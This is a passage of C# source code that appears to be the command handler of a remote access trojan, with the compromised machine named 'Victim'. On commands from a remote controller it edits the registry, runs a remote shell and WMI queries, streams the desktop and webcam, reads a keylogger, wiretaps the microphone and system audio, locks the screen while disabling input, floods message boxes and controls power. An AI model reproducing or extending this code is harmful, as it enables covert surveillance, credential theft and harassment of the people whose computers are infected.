                    else if (cmd[1] == "edit") //Edit Key
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[2]);
                        string valName = Crypto.b64D2Str(cmd[3]);
                        RegistryValueKind valKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[4]);
                        string szValData = cmd[4];
                        object objValData = null;
                        var x = (0, "");

                        switch (valKind)
                        {
                            case RegistryValueKind.String:
                                objValData = Crypto.b64D2Str(szValData);
                                break;
                            case RegistryValueKind.ExpandString:
                                objValData = Crypto.b64D2Str(szValData);
                                break;
                            case RegistryValueKind.Binary:
                                objValData = Convert.FromBase64String(szValData);
                                break;
                            case RegistryValueKind.DWord:
                                objValData = Convert.ToInt32(szValData); //4 bytes
                                break;
                            case RegistryValueKind.MultiString:
                                objValData = Crypto.b64D2Str(szValData);
                                break;
                            case RegistryValueKind.QWord:
                                objValData = Convert.ToUInt64(szValData); //8 bytes
                                break;
                        }

                        if (objValData == null)
                        {
                            x.Item2 = Crypto.b64E2Str("objValData is null.");
                        }
                        else
                        {
                            x = funcReg.EditValue(regFullPath, valName, objValData);
                        }

                        v.SendCommand($"reg|edit|{regFullPath}|{valName}|{x.Item1}|{x.Item2}");
                    }
                    else if (cmd[1] == "find")
                    {
                        string[] regFullPaths = cmd[2].Split(',').Select(y => Crypto.b64D2Str(y)).ToArray();
                        string[] patterns = cmd[3].Split(',').Select(y => Crypto.b64D2Str(y)).ToArray(); //Regex Patterns.
                        int method = int.Parse(cmd[4]); //0: Name Only, 1: FullPath
                        bool bIgnoreCase = int.Parse(cmd[5]) == 1;
                        int dwType = int.Parse(cmd[6]); //0: Key, 1: Value, 2: Both.
                        RegistryValueKind kind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[7]);

                        List<(string, string, string)> x = funcReg.Find(regFullPaths, patterns, method, bIgnoreCase, dwType, kind);

                        string payload = string.Join(",",
                            x.Select(y =>
                            $"{y.Item1};" + //Type: k(key), v(value)
                            $"{Crypto.b64E2Str(y.Item2)};" + //Name(for key, same as path)
                            $"{Crypto.b64E2Str(y.Item3)}" //Path
                        ).ToArray());

                        v.SendCommand($"reg|find|{payload}");
                    }
                    else if (cmd[1] == "del")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[3]);

                        if (cmd[2] == "key")
                        {
                            var x = funcReg.DeleteKey(regFullPath);
                            v.SendCommand($"reg|del|key|{x.Item1}|{x.Item2}");
                        }
                        else if (cmd[2] == "val")
                        {
                            string[] valNames = cmd[4].Split(',').Select(y => Crypto.b64D2Str(y)).ToArray();
                            //var x = funcReg.DeleteValue(regFullPath, valName);
                            //v.SendCommand($"reg|del|val|{x.Item1}|{x.Item2}");
                            StringBuilder sb = new StringBuilder();
                            foreach (string valName in valNames)
                            {
                                var x = funcReg.DeleteValue(regFullPath, valName);
                                sb.Append($"{valName},{x.Item1},{Crypto.b64E2Str(x.Item2)};");
                            }

                            v.SendCommand($"reg|del|val|{cmd[3]}|{sb.ToString()}");
                        }
                    }
                    else if (cmd[1] == "export")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[2]);
                        string servPath = Crypto.b64D2Str(cmd[3]);

                        var x = funcReg.Export(regFullPath, servPath);
                        v.SendCommand($"reg|export|{x.Item1}|{x.Item2}|{cmd[3]}");
                    }
                    else if (cmd[1] == "import")
                    {
                        string content = Crypto.b64D2Str(cmd[2]);
                        string tmpFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), Path.GetTempFileName() + ".reg");
                        File.WriteAllText(tmpFile, content);
                        var x = funcReg.Import(tmpFile);

                        if (File.Exists(tmpFile))
                            File.Delete(tmpFile);

                        v.SendCommand($"reg|import|{x.Item1}|{x.Item2}");
                    }
                }
                #endregion
                #region Connection Info

                else if (cmd[0] == "conn")
                {
                    if (funcConn == null)
                        funcConn = new FuncConn();

                    if (cmd[1] == "init")
                    {
                        v.encSend(2, 0, "conn|init|" + funcConn.GetConn());
                    }
                }

                #endregion
                #region ServMgr
                else if (cmd[0] == "serv")
                {
                    if (cmd[1] == "init")
                    {
                        string data = WMI_Query(Crypto.b64D2Str(cmd[2]));
                        v.encSend(2, 0, "serv|init|" + data);
                    }
                    else if (cmd[1] == "control")
                    {
                        string[] names = Crypto.b64D2Str(cmd[2]).Split(',').Select(x => Crypto.b64E2Str(x)).ToArray();
                        string status = cmd[3];
                        if (status == "restart")
                        {
                            funcServ.ServiceControl(names, "Stopped");
                            v.encSend(2, 0, "serv|control|" + funcServ.ServiceControl(names, "Running"));
                        }
                        else
                        {
                            v.encSend(2, 0, "serv|control|" + funcServ.ServiceControl(names, status));
                        }
                    }
                }
                #endregion
                #region WindowMgr

                else if (cmd[0] == "window")
                {
                    if (funcWindow == null)
                        funcWindow = new FuncWindow();

                    if (cmd[1] == "init")
                    {
                        var x = funcWindow.GetWindow();

                        string payload = string.Empty;
                        if (x.Item1 == 1)
                        {
                            List<WindowInfo> lsResult = x.Item3;
                            payload = string.Join(";", lsResult.Select(s =>
                                string.Join(",", new string[]
                                {
                                    Crypto.b64E2Str(s.szTitle),
                                    s.iWindow == null ? "?" : Global.IconToBase64(s.iWindow),
                                    Crypto.b64E2Str(s.szFilePath),
                                    s.szProcessName == null ? "[Access Denial]" : s.szProcessName,
                                    s.nProcessId == null ? "[Access Denial]" : s.nProcessId.ToString(),
                                    s.nHandle == null ? "[Access Denial]" : s.nHandle.ToString(),
                                })
                            ));
                        }

                        v.SendCommand($"window|init|{x.Item1}|{Crypto.b64E2Str(x.Item2)}|{payload}");
                    }
                    else if (cmd[1] == "shot")
                    {
                        IntPtr hWnd = (IntPtr)int.Parse(cmd[3]);
                        if (cmd[2] == "api") //DC
                        {
                            var x = funcWindow.CaptureWindowWithAPI(hWnd);
                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : Global.ImageToBase64(x.Item3))}");
                        }
                        else if (cmd[2] == "fore")
                        {
                            var x = funcWindow.CaptureWindowWithFore(hWnd);
                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : Global.ImageToBase64(x.Item3))}");
                        }
                    } 
                }

                #endregion
                #region System Informaiton
                else if (cmd[0] == "system") //WINDOWS SYSTEM (CONTROL PANEL)
                {
                    if (funcSystem == null)
                        funcSystem = new FuncSystem();

                    if (cmd[1] == "app")
                    {
                        if (cmd[2] == "init") //GET APPLICATION LIST
                        {
                            List<string[]> apps = funcSystem.ListApp();
                            string data = string.Join(",", apps.Select(x => string.Join(";", x.Select(y => Crypto.b64E2Str(y)))).ToArray());
                            v.encSend(2, 0, "system|app|init|" + data);
                        }
                        else if (cmd[2] == "detail") //GET MORE INFORMATION OF SPECIFIED APPLCIATION.
                        {
                            string id = Crypto.b64E2Str(cmd[3]);
                            string query = $"select * from win32_product where productid = '{id}'";
                            string[] fields = Global.WMI_QueryNoEncode(query);


                        }
                    }
                    else if (cmd[1] == "ev") //ENVIRONMENT VARIABLE
                    {
                        if (cmd[2] == "init")
                        {
                            var s = funcSystem.GetEnvironmentVariables();
                            string payload = string.Join(";", s.Item3.Select(x => $"{x.Item1},{x.Item2},{Crypto.b64E2Str(x.Item3)}"));
                            v.SendCommand($"system|ev|init|{s.Item1}|{Crypto.b64E2Str(s.Item2)}|{payload}");
                        }
                        else if (cmd[2] == "set")
                        {
                            string szName = cmd[3];
                            EnvironmentVariableTarget target = (EnvironmentVariableTarget)Enum.Parse(typeof(EnvironmentVariableTarget), cmd[4]);
                            string szVals = Crypto.b64D2Str(cmd[5]);
                            var x = funcSystem.SetEnvironmentVariables(szName, target, szVals);
                            v.SendCommand($"system|ev|set|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                        }
                    }
                    else if (cmd[1] == "device")
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> devices = funcSystem.Device_ListDevices();
                            string data = string.Join(",", devices.Select(x => string.Join(";", x.Select(y => Crypto.b64E2Str(y)).ToArray())).ToArray());
                            v.encSend(2, 0, "system|device|init|" + data);
                        }
                        else if (cmd[2] == "enable") //ENABLE, DISABLE
                        {
                            var x = funcSystem.DeviceEnable(cmd[3], bool.Parse(cmd[4]));
                            v.encSend(2, 0, $"system|device|{cmd[2]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                        }
                        else if (cmd[2] == "info")
                        {
                            string szDeviceName = Crypto.b64D2Str(cmd[3]);
                            var x = funcSystem.DeviceGetInfo(szDeviceName);
                            FuncSystem.DeviceInfo info = x.Item3;

                            string payload = string.Join("|", new string[]
                            {
                                "system",
                                "device",
                                "info",
                                x.Item1.ToString(),
                                Crypto.b64E2Str(x.Item2),

                                string.Join(",", new string[]
                                {
                                    "Name:" + info.szDeviceName,
                                    "Device ID:" + info.szDeviceID,
                                    "Manufacturer:" + info.szManufacturer,
                                    "Status:" + info.szStatus,
                                    "Caption:" + info.szCaption,
                                    "Description:" + info.szDescription,
                                }),
                            });

                            v.SendCommand(payload);
                        }
                    }
                    else if (cmd[1] == "startup") //START UP
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> apps = funcSystem.GetStartUp();

                        }
                    }
                    else if (cmd[1] == "if")
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> interfaces = funcSystem.If_ListInterface();
                            v.encSend(2, 0, "system|if|init|" + string.Join(",", interfaces.Select(x => string.Join(";", x.Select(y => Crypto.b64E2Str(y)).ToArray())).ToArray()));
                        }
                        else if (cmd[2] == "enable") //ENABLE, DISABLE
                        {
                            v.encSend(2, 0, $"system|if|{cmd[2]}|" + funcSystem.If_Enable(Crypto.b64D2Str(cmd[3]), bool.Parse(cmd[4])));
                        }
                    }
                }
                #endregion
                #region Shell
                else if (cmd[0] == "shell")
                {
                    if (cmd[1] == "start")
                    {
                        string exePath = Crypto.b64D2Str(cmd[2]);
                        string init_path = Crypto.b64D2Str(cmd[3]);
                        funcShell = new RemoteShell(v, exePath, init_path);
                    }
                    else if (cmd[1] == "cmd")
                    {
                        funcShell.SendCmd(Crypto.b64D2Str(cmd[2]));
                    }
                    else if (cmd[1] == "tab")
                    {
                        funcShell.ProcessTab(Crypto.b64D2Str(cmd[2]));
                    }
                    else if (cmd[1] == "ctrl")
                    {
                        //cmd[2]: CtrlC, CtrlZ
                        ShellCtrl ctrl = (ShellCtrl)Enum.Parse(typeof(ShellCtrl), cmd[2]);

                    }
                }
                #endregion
                #region WMI Shell
                else if (cmd[0] == "wmi")
                {
                    try { v.encSend(2, 0, "wmi|output|" + WMI_Query(Crypto.b64D2Str(cmd[1]))); }
                    catch (Exception ex) { v.encSend(2, 0, "wmi|error|" + Crypto.b64E2Str(ex.Message)); }
                }
                #endregion
                #region Remote Desktop(Monitor)
                else if (cmd[0] == "desktop")
                {
                    if (cmd[1] == "init")
                    {
                        DesktopInit(v);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "screenshot")
                    {
                        string[] tmp = cmd[2].Split(',');
                        string device_name = tmp[0];
                        int width = int.Parse(tmp[1]);
                        int height = int.Parse(tmp[2]);

                        if (cmd[1] == "start")
                        {
                            send_screenshot = false;
                            while (!send_stopped)
                                Thread.Sleep(100);

                            send_screenshot = true;
                            send_stopped = false;
                            new Thread(() => DesktopStart(v, device_name, width, height)).Start();
                        }
                        else
                        {
                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + Global.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
                        }
                    }
                    else if (cmd[1] == "stop")
                    {
                        send_screenshot = false;
                    }
                    else if (cmd[1] == "delay")
                    {
                        int nDelay = int.Parse(cmd[2]);
                        m_nDesktopDelay = nDelay;
                    }
                }
                #endregion
                #region Mouse Control
                else if (cmd[0] == "mouse")
                {
                    if (funcMouse == null)
                        funcMouse = new FuncMouse();

                    if (cmd[1] == "status")
                    {
                        v.encSend(2, 0, $"mouse|status|" + funcMouse.Status());
                    }
                    else if (cmd[1] == "move")
                    {
                        Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
                    }
                    else if (cmd[1] == "btn")
                    {
                        switch (cmd[2])
                        {
                            case "RD":
                                funcMouse.MouseRD();
                                break;
                            case "RU":
                                funcMouse.MouseRU();
                                break;
                            case "LD":
                                funcMouse.MouseLD();
                                break;
                            case "LU":
                                funcMouse.MouseLU();
                                break;
                            case "LC":
                                funcMouse.MouseLC();
                                break;
                            case "RC":
                                funcMouse.MouseClk();
                                break;
                            case "SC":
                                funcMouse.MouseSC(int.Parse(cmd[3]));
                                break;
                        }
                    }
                }
                #endregion
                #region Keyboard Control

                else if (cmd[0] == "keyboard")
                {
                    if (keylogger == null)
                        keylogger = new KeyLogger();

                    if (keyboard == null)
                        keyboard = new Keyboard(keylogger);

                    if (cmd[1] == "vk")
                    {
                        Keys key = (Keys)int.Parse(cmd[3]);
                        if (cmd[2] == "down")
                        {
                            keyboard.KeyDown(key);
                        }
                        else if (cmd[2] == "up")
                        {
                            keyboard.KeyUp(key);
                        }
                    }
                    else if (cmd[1] == "enable")
                    {
                        keyboard.FlipFlopKeyboardDisable();
                    }
                    else if (cmd[1] == "smile")
                    {
                        keyboard.FlipFlopSmileKey();
                    }
                }
                
                #endregion
                #region Keylogger
                else if (cmd[0] == "keylogger")
                {
                    if (keylogger == null)
                        keylogger = new KeyLogger();

                    if (cmd[1] == "start") //START KEY LOGGER
                    {
                        
                    }
                    else if (cmd[1] == "stop") //STOP KEY LOGGER
                    {

                    }
                    else if (cmd[1] == "read") //READ KEY LOGGER FILE
                    {
                        v.encSend(2, 0, $"keylogger|read|{Crypto.b64E2Str(keylogger.file_keylogger)}|" + Crypto.b64E2Str(keylogger.Read()));
                    }
                    else if (cmd[1] == "new")
                    {
                        var x = keylogger.NewFile();
                    }
                    else if (cmd[1] == "del")
                    {
                        var x = keylogger.Delete();
                    }
                }
                #endregion
                #region Webcam

                else if (cmd[0] == "webcam") //Webcam
                {
                    if (cmd[1] == "init")
                    {
                        webcam = new Webcam();
                        v.encSend(2, 0, "webcam|init|" + string.Join(",", webcam.GetDevices()));
                    }
                    else if (cmd[1] == "start" || cmd[1] == "snapshot")
                    {
                        if (webcam != null && webcam.stop_capture == false)
                        {
                            webcam.stop_capture = true;

                            while (!webcam.is_stopped)
                                Thread.Sleep(1000);

                            webcam = null;
                        }

                        webcam = new Webcam();
                        webcam.stop_capture = false;
                        webcam.snapshot = (cmd[1] == "snapshot");
                        webcam.monitor = (cmd[3] == "monitor");
                        webcam.v = v;
                        new Thread(() => webcam.StartCapture(int.Parse(cmd[2]))).Start();
                    }
                    else if (cmd[1] == "stop")
                    {
                        if (webcam != null && webcam.stop_capture == false)
                        {
                            webcam.stop_capture = true;

                            while (!webcam.is_stopped)
                                Thread.Sleep(1000);

                            webcam = null;
                        }
                    }
                    else if (cmd[1] == "mul")
                    {
                        if (cmd[2] == "shot")
                        {

                        }
                    }
                    else if (cmd[1] == "delay")
                    {
                        int nDelay = int.Parse(cmd[2]);
                        webcam.nDelay = nDelay;
                    }
                }

                #endregion
                #region FunStuff

                else if (cmd[0] == "fun")
                {
                    if (keylogger == null)
                        keylogger = new KeyLogger();
                    if (keyboard == null)
                        keyboard = new Keyboard(keylogger);
                    if (funcFun == null)
                        funcFun = new FuncFun();

                    if (cmd[1] == "msg")
                    {
                        string mode = cmd[2];
                        string param = cmd[3];

                        string title = Crypto.b64D2Str(cmd[4]);
                        string text = Crypto.b64D2Str(cmd[5]);

                        if (mode == "mul")
                        {
                            for (int i = 0; i < int.Parse(param); i++)
                            {
                                MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), cmd[6], true);
                                MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);
                                new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
                            }
                        }
                        else if (mode == "inf")
                        {
                            if (param == "start")
                            {
                                MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), cmd[6], true);
                                MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);

                                msg_inf = true;
                                while (msg_inf)
                                {
                                    new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
                                    Thread.Sleep(100);
                                }
                            }
                            else if (param == "stop")
                            {
                                msg_inf = false;
                            }
                        }
                    }
                    else if (cmd[1] == "balloontip")
                    {
                        int nTimeout = int.Parse(cmd[2]);
                        int nSysIcon = int.Parse(cmd[3]);
                        ToolTipIcon icon = (ToolTipIcon)Enum.Parse(typeof(ToolTipIcon), cmd[4]);
                        string szTitle = Crypto.b64D2Str(cmd[5]);
                        string szText = Crypto.b64D2Str(cmd[6]);

                        Icon sysIcon = null;
                        switch (nSysIcon)
                        {
                            case 0:
                                sysIcon = SystemIcons.Application;
                                break;
                            case 1:
                                sysIcon = SystemIcons.Asterisk;
                                break;
                            case 2:
                                sysIcon = SystemIcons.Error;
                                break;
                            case 3:
                                sysIcon = SystemIcons.Exclamation;
                                break;
                            case 4:
                                sysIcon = SystemIcons.Hand;
                                break;
                            case 5:
                                sysIcon = SystemIcons.Information;
                                break;
                            case 6:
                                sysIcon = SystemIcons.Question;
                                break;
                            case 7:
                                sysIcon = SystemIcons.Shield;
                                break;
                            case 8:
                                sysIcon = SystemIcons.Warning;
                                break;
                            case 9:
                                sysIcon = SystemIcons.WinLogo;
                                break;
                        }

                        var x = funcFun.ShowBalloonTip(sysIcon, icon, nTimeout, szTitle, szText);
                    }
                    else if (cmd[1] == "screen")
                    {
                        frmLockScreen f_lock = null;
                        foreach (Form f in Application.OpenForms)
                        {
                            if (f.GetType() == typeof(frmLockScreen) && (Victim)f.Tag == v)
                            {
                                f_lock = (frmLockScreen)f;
                                fs.Add(f_lock);
                            }
                        }
                        if (keyboard == null)
                        {
                            if (keylogger == null)
                                keylogger = new KeyLogger();

                            keyboard = new Keyboard(keylogger);
                        }

                        if (cmd[2] == "lock")
                        {
                            if (f_lock == null || f_lock.IsDisposed)
                            {
                                //Show image
                                Invoke(new Action(() =>
                                {
                                    foreach (Screen screen in Screen.AllScreens)
                                    {
                                        f_lock = new frmLockScreen();
                                        f_lock.Tag = v;
                                        f_lock.Show();

                                        f_lock.Focus();
                                        f_lock.BringToFront();
                                        f_lock.Location = new Point(screen.Bounds.Left, screen.Bounds.Top);
                                        f_lock.WindowState = FormWindowState.Maximized;
                                        f_lock.ShowImage(cmd[3]);

                                        l_frmLockScreen.Add(f_lock);

                                        WinAPI.SetForegroundWindow(f_lock.Handle);
                                    }
                                }));

                                Cursor.Hide();
                                keylogger.disable_keyboard = true;
                            }
                            else
                            {
                                foreach (frmLockScreen f in l_frmLockScreen)
                                {
                                    f.ShowImage(cmd[3]);
                                }

                                Cursor.Show();
                                keylogger.disable_keyboard = false;
                            }

                            //Disable keyboard and mouse.
                            keyboard.Disable();
                            funcFun.HideMouse();

                            v.encSend(2, 0, "fun|screen|lock|1");
                        }
                        else if (cmd[2] == "ulock")
                        {
                            foreach (frmLockScreen f in l_frmLockScreen)
                            {
                                f.allow_close = true;
                                f.Close();
                            }
                            l_frmLockScreen.Clear();
                            keyboard.Enable();
                            funcFun.ShowMouse();

                            v.SendCommand("fun|screen|lock|0");
                        }
                    }
                    else if (cmd[1] == "wp") //wallpaper
                    {
                        if (cmd[2] == "set")
                        {
                            Image img = Global.Base64ToImage(cmd[3]);
                            var x = funcFun.SetWallpaper(img);
                            v.SendCommand($"fun|wp|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                        }
                        else if (cmd[2] == "get")
                        {
                            var x = funcFun.GetWallpaper();
                            string szB64Img = x.Item3 == null ? string.Empty : Global.BitmapToBase64((Bitmap)x.Item3);

                            v.SendCommand($"fun|wp|get|{x.Item1}|{Crypto.b64E2Str(x.Item2)}|{szB64Img}");
                        }
                    }
                    else if (cmd[1] == "mouse")
                    {
                        var x = (0, "");
                        
                        if (cmd[2] == "hide")
                        {
                            x = funcFun.FlipFlopHideMouse();
                        }
                        else if (cmd[2] == "crazy")
                        {
                            x = funcFun.FlipFlopMouseCrazy();
                        }
                        else if (cmd[2] == "lock")
                        {
                            x = funcFun.FlipFlopMouseLock();
                        }
                        else if (cmd[2] == "trails")
                        {
                            x = funcFun.FlipFlopMouseTrails();
                        }

                        v.SendCommand($"fun|mouse|{cmd[2]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "hwnd")
                    {
                        if (cmd[2] == "init")
                        {
                            string BooleanToString(bool bValue) => bValue ? "True" : "False";

                            bool bMouseVisible = funcFun.bMouseVisible;
                            bool bMouseCrazy = funcFun.m_bMouseCrazy;
                            bool bMouseLock = funcFun.m_bMouseLock;
                            bool bMouseTrail = funcFun.m_bMouseTrail;

                            bool bHideTray = funcFun.bHideTray;
                            bool bHideDesktopIcon = funcFun.bHideDesktopIcon;
                            bool bHideClock = funcFun.bHideClock;
                            bool bHideStartOrb = funcFun.bHideStartOrb;
                            bool bHideTaskbar = funcFun.bHideTaskbar;

                            bool bKeySmile = keylogger.smile_key;
                            bool bKeyDisable = keylogger.disable_keyboard;

                            v.SendCommand(string.Join("|", new string[]
                            {
                                "fun",
                                "hwnd",
                                "init",

                                string.Join(",", new string[]
                                {
                                    //Mouse
                                    "MouseVisible:" + BooleanToString(bMouseVisible),
                                    "MouseCrazy:" + BooleanToString(bMouseCrazy),
                                    "MouseLock:" + BooleanToString(bMouseLock),
                                    "MouseTrail:" + BooleanToString(bMouseTrail),

                                    //HWND
                                    "HideTray:" + BooleanToString(bHideTray),
                                    "HideDesktopIcon:" + BooleanToString(bHideDesktopIcon),
                                    "HideClock:" + BooleanToString(bHideClock),
                                    "HideStartOrb:" + BooleanToString(bHideStartOrb),
                                    "HideTaskbar:" + BooleanToString(bHideTray),

                                    //Keyboard
                                    "KeySmile:" + BooleanToString(bKeySmile),
                                    "KeyDisable:" + BooleanToString(bKeyDisable),
                                }),
                            }));
                        }
                        else if (cmd[2] == "hide")
                        {
                            IntPtr hWnd = (IntPtr)int.Parse(cmd[3]);
                            WinAPI.ShowWindow(hWnd, WinAPI.SW_HIDE);
                        }
                        else if (cmd[2] == "show")
                        {
                            IntPtr hWnd = (IntPtr)int.Parse(cmd[3]);
                            WinAPI.ShowWindow(hWnd, WinAPI.SW_SHOW);
                        }
                        else if (cmd[2] == "deskicon")
                        {
                            var x = funcFun.FlipFlopDesktopIcon();
                        }
                        else if (cmd[2] == "tray")
                        {
                            var x = funcFun.FlipFlopTray();
                        }
                        else if (cmd[2] == "taskbar")
                        {
                            var x = funcFun.FlipFlopTaskbar();
                        }
                        else if (cmd[2] == "clock")
                        {
                            var x = funcFun.FlipFlopClock();
                        }
                        else if (cmd[2] == "startorb")
                        {
                            var x = funcFun.FlipFlopStartOrb();
                        }
                    }
                }

                #endregion
                #region Thread

                else if (cmd[0] == "thread")
                {
                    int nProcID = int.Parse(cmd[2]);
                    Process proc = Process.GetProcessById(nProcID);
                    uint nThreadID = (uint)proc.Threads[0].Id;
                    IntPtr hThread = WinAPI.OpenThread(WinAPI.THREAD_SUSPEND_RESUME, false, nThreadID);

                    if (hThread == IntPtr.Zero)
                    {
                        v.SendCommand("thread|error");
                        return;
                    }

                    if (cmd[1] == "suspend")
                    {
                        WinAPI.SuspendThread(hThread);
                        WinAPI.CloseHandle(hThread);
                    }
                    else if (cmd[1] == "resume")
                    {
                        WinAPI.ResumeThread(hThread);
                        WinAPI.CloseHandle(hThread);
                    }
                }

                #endregion
                #region Power

                else if (cmd[0] == "power")
                {
                    if (cmd[1] == "st")
                    {
                        FuncPower.Shutdown(int.Parse(cmd[2]));
                    }
                    else if (cmd[1] == "rs")
                    {
                        FuncPower.Restart(int.Parse(cmd[2]));
                    }
                    else if (cmd[1] == "lo")
                    {
                        FuncPower.Logoff();
                    }
                    else if (cmd[1] == "sl")
                    {
                        FuncPower.Sleep();
                    }
                }

                #endregion
                #region Chat Message
                else if (cmd[0] == "chat")
                {
                    frmChat f_chat = null;
                    foreach (Form f in Application.OpenForms)
                    {
                        if (f.GetType() == typeof(frmChat) && (Victim)f.Tag == v)
                        {
                            f_chat = (frmChat)f;
                            break;
                        }
                    }

                    if (cmd[1] == "init")
                    {
                        if (f_chat == null || f_chat.IsDisposed)
                        {
                            Invoke(new Action(() =>
                            {
                                f_chat = new frmChat();
                                f_chat.v = v;
                                f_chat.Tag = v;
                                f_chat.ShowIcon = false;
                                f_chat.ShowInTaskbar = false;
                                f_chat.Text = $@"Message";
                                f_chat.Show();
                            }));
                        }
                    }
                    else if (cmd[1] == "msg")
                    {
                        f_chat.ShowMsg(Crypto.b64D2Str(cmd[2]), Crypto.b64D2Str(cmd[3]).Trim());
                    }
                    else if (cmd[1] == "max")
                    {
                        f_chat.WindowState = FormWindowState.Maximized;
                    }
                    else if (cmd[1] == "min")
                    {
                        f_chat.WindowState = FormWindowState.Minimized;
                    }
                    else if (cmd[1] == "n")
                    {
                        f_chat.WindowState = FormWindowState.Normal;
                    }
                    else if (cmd[1] == "close")
                    {
                        f_chat.CloseForm();
                    }
                }
                #endregion
                #region Audio(Sound)
                else if (cmd[0] == "audio")
                {
                    if (funcMicAudio == null)
                    {
                        string mic_output = Path.Combine(Path.GetTempPath(), "wt_mic.wav");
                        string sys_output = Path.Combine(Path.GetTempPath(), "wt_sys.wav");
                        funcMicAudio = new MicAudio(v, mic_output, sys_output);
                    }
                    if (funcAudioPlayer == null)
                        funcAudioPlayer = new AudioPlayer();

                    if (cmd[1] == "init")
                    {
                        var lsMicDevices = funcMicAudio.GetMicrophoneDevices();
                        var lsSysDevices = funcMicAudio.GetSpeakerDevices();

                        string szPayload1 = string.Join(";", lsMicDevices.Select(x => $"{x.Item1},{Crypto.b64E2Str(x.Item2)}"));
                        string szPayload2 = string.Join(";", lsSysDevices.Select(x => $"{x.Item1},{Crypto.b64E2Str(x.Item2)}"));

                        v.SendCommand($"audio|init|{szPayload1}|{szPayload2}");

                        //v.encSend(2, 0, "audio|init|" + funcMicAudio.Init());
                    }
                    else if (cmd[1] == "vol") //VOLUME
                    {
                        float vol = float.Parse(cmd[2]);
                        funcMicAudio.SetSystemAudioVolume(vol);
                    }
                    else if (cmd[1] == "mute")
                    {
                        if (cmd[2] == "mute")
                        {
                            funcMicAudio.DisableMute = false;
                            funcMicAudio.MuteDevice = true;
                            funcMicAudio.SetSystemAudioVolume(0.0f);
                        }
                        else if (cmd[2] == "unmute")
                        {
                            funcMicAudio.MuteDevice = false;
                        }
                        else if (cmd[2] == "disable") //SHUT SOMEONE MOUTH
                        {
                            funcMicAudio.MuteDevice = false;
                            funcMicAudio.DisableMute = true;
                        }
                        else if (cmd[2] == "enable") //MAKE SOMEONE EMBARRASSING
                        {
                            funcMicAudio.DisableMute = false;
                        }

                        v.encSend(2, 0, "audio|update|" + cmd[2]);
                    }
                    else if (cmd[1] == "speak")
                    {
                        if (cmd[2] == "text")
                        {
                            funcMicAudio.SpeechText(Crypto.b64D2Str(cmd[3]), int.Parse(cmd[4]));
                        }
                    }
                    else if (cmd[1] == "play")
                    {
                        if (cmd[2] == "sys")
                        {
                            int times = int.Parse(cmd[3]);
                            int sound = int.Parse(cmd[4]);

                            for (int i = 0; i < times; i++)
                            {
                                new Thread(() =>
                                {
                                    funcAudioPlayer.SystemSound(int.Parse(cmd[4]));
                                }).Start();

                                Thread.Sleep(100);
                            }
                        }
                        else if (cmd[2] == "mp3")
                        {

                        }
                    }
                    else if (cmd[1] == "wiretap") //EVASDROPPING
                    {
                        bool bOffline = cmd[3] == "off";

                        if (cmd[2] == "system") //SYSTEM AUDIO
                        {
                            if (cmd[4] == "start")
                            {
                                var x = funcMicAudio.StartWiretapping(cmd[5], int.Parse(cmd[6]));
                                v.SendCommand($"wiretap|system|start|{cmd[6]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                            }
                            else if (cmd[4] == "stop")
                            {
                                var x = funcMicAudio.StopWiretapping(cmd[5], int.Parse(cmd[6]));
                                v.SendCommand($"wiretap|system|stop|{cmd[6]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                            }
                            else if (cmd[4] == "write")
                            {
                                string szMp3FileName = Crypto.b64D2Str(cmd[6]);
                                var x = cmd[5] == "1" ? funcMicAudio.StartSysRecord(szMp3FileName, bOffline) : funcMicAudio.StopSysRecord();

                                v.SendCommand($"audio|wiretap|system|mp3|path|{cmd[5]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                            }
                        }
                        else if (cmd[2] == "micro") //MICROPHONE
                        {
                            if (cmd[4] == "start")
                            {
                                var x = funcMicAudio.StartWiretapping(cmd[5], int.Parse(cmd[6]));
                                v.SendCommand($"wiretap|micro|start|{cmd[6]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                            }
                            else if (cmd[4] == "stop")
                            {
                                var x = funcMicAudio.StopWiretapping(cmd[5], int.Parse(cmd[6]));
                                v.SendCommand($"wiretap|micro|stop|{cmd[6]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                            }
                            else if (cmd[4] == "write")
                            {
                                string szMp3FileName = Crypto.b64D2Str(cmd[6]);
                                var x = cmd[5] == "1" ? funcMicAudio.StartMicRecord(szMp3FileName, bOffline) : funcMicAudio.StopMicRecord();

                                v.SendCommand($"audio|wiretap|micro|mp3|path|{cmd[5]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                            }
                        }
                    }
                    else if (cmd[1] == "close")
                    {
                        //Reset All

                    }
                }
                #endregion
                #region Run Script

                else if (cmd[0] == "exec") //Execute
